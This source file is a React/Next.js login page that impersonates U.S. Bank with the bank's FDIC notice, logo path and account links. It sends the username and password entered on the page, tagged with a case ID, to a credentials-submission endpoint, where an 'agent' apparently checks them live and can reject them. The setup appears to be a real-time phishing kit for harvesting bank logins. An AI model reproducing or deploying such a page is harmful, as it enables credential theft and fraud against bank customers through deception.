'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { WaitingState } from '@/components/verification/WaitingState';
// import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { Eye, EyeOff, AlertCircle } from 'lucide-react';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  /**
   * Handle form submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!username.trim()) {
        setFieldError('Please enter your username');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
      } finally {
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid, caseId]
  );

  if (status === 'waiting') {
    return <WaitingState message="Verifying your credentials..." />;
  }

  return (
    <>
      <div className="fdic-box">
        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <section className="login-header">
        <h2>Account login</h2>
      </section>

      <form className="login-form" onSubmit={handleSubmit}>
        {/* Username */}
        {/* Note: In US Bank logic, if one field errors, do we error both? Or just generic? 
            Reference CSS shows .form-group.error. 
            We will assume fieldError applies generally, or perhaps we should check specific fields?
            For now, if there is a general fieldError (e.g. "Submission failed"), we might not want to highlight fields unless we know which one.
            But user requirements say "red etc yk the styles".
            We'll highlight if field is empty on submit? The logic currently sets a generic string.
            Let's apply error state if fieldError is present for simplicity, or refine logic if we had field-specific errors.
        */}
        <div className={`form-group ${(!username.trim() && isSubmitting) || (fieldError && !password && !username) ? 'error' : ''}`}>
          <input
            type="text"
            id="username"
            name="username"
            className="input-field"
            autoComplete="username"
            placeholder=" "
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              if (fieldError) setFieldError('');
            }}
            disabled={isSubmitting || loading}
          />
          <label htmlFor="username" className="input-label">Username</label>
        </div>

        {/* Remember Me */}
        <div className="checkbox-group">
          <input type="checkbox" id="remember" name="remember" />
          <label htmlFor="remember" className="checkbox-label">Remember my username</label>
        </div>

        {/* Password */}
        <div className={`form-group ${(!password && isSubmitting) || (fieldError && !password && !username) ? 'error' : ''}`} style={((!password && isSubmitting) || (fieldError && !password && !username)) || fieldError || error ? { marginBottom: '4px' } : {}}>
          <input
            type={showPassword ? "text" : "password"}
            id="password"
            name="password"
            className="input-field"
            autoComplete="current-password"
            placeholder=" "
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              if (fieldError) setFieldError('');
            }}
            disabled={isSubmitting || loading}
          />
          <label htmlFor="password" className="input-label">Password</label>
          <button
            type="button"
            className="show-hide-btn"
            onClick={() => setShowPassword(!showPassword)}
          >
            {showPassword ? 'Hide' : 'Show'}
          </button>
        </div>

        {/* Global/Field Error Display */}
        {fieldError && (
          <div className="error-message" style={{ marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <AlertCircle className="h-4 w-4" />
            <span>{fieldError}</span>
          </div>
        )}
        {(error && !fieldError) && (
          <div className="error-message" style={{ marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <AlertCircle className="h-4 w-4" />
            <span>{error}</span>
          </div>
        )}

        <button type="submit" className="btn btn-primary" disabled={loading}>
          {isSubmitting ? 'Logging in...' : 'Log in'}
        </button>

        <div className="link-group">
          <a href="#" className="link arrow">Forgot username or password</a>
          <a href="#" className="link subtle">Enroll in online banking</a>
          <a href="#" className="link subtle">Corporate & Commercial banking login</a>
        </div>
      </form>
    </>
  );
}
